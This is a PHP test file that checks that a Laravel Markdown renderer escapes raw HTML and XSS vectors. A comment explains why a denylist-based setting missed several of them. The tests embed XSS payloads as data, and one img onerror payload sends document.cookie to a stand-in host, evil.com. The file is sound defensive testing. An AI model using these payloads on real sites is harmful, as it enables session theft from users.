<?php

use Spatie\LaravelMarkdown\MarkdownRenderer;

it('escapes script tags in markdown output', function () {
    $renderer = app(MarkdownRenderer::class);

    $html = $renderer->toHtml('<script>alert("xss")</script>');

    expect($html)->not->toContain('<script>')
        ->toContain('&lt;script');
});

it('escapes img onerror XSS payloads in markdown output', function () {
    $renderer = app(MarkdownRenderer::class);

    $html = $renderer->toHtml('<img src=x onerror="fetch(\'https://evil.com/\'+document.cookie)">');

    expect($html)->not->toContain('<img ')
        ->toContain('&lt;img');
});

it('escapes every raw HTML vector the renderer used to pass through', function (string $payload, string $marker) {
    /*
     * The four that survived `html_input => allow` while the three tests
     * around them stayed green — which is what made the gap easy to miss.
     * `DisallowedRawHtmlExtension` is a DENYLIST and only ever caught
     * `<script>` and `<iframe>`; `allow_unsafe_links => false` inspects
     * Markdown links and never sees an attribute of raw HTML.
     */
    $html = app(MarkdownRenderer::class)->toHtml($payload);

    expect($html)->not->toContain($marker);
})->with([
    'img onerror' => ['<img src=x onerror="alert(1)">', '<img '],
    'svg onload' => ['<svg onload="alert(1)">', '<svg'],
    'div onclick' => ['<div onclick="alert(1)">x</div>', '<div'],
    'raw javascript: anchor' => ['<a href="javascript:alert(1)">x</a>', '<a href="javascript:'],
]);

it('blocks javascript: protocol links in markdown output', function () {
    $renderer = app(MarkdownRenderer::class);

    $html = $renderer->toHtml('[click me](javascript:alert("xss"))');

    expect($html)->not->toContain('javascript:');
});

it('still renders valid markdown formatting', function () {
    $renderer = app(MarkdownRenderer::class);

    $html = $renderer->toHtml("**Bold text** and [a link](https://example.com)\n\n- Item 1\n- Item 2");

    expect($html)->toContain('<strong>Bold text</strong>')
        ->toContain('<a href="https://example.com">a link</a>')
        ->toContain('<li>Item 1</li>')
        ->toContain('<li>Item 2</li>');
});
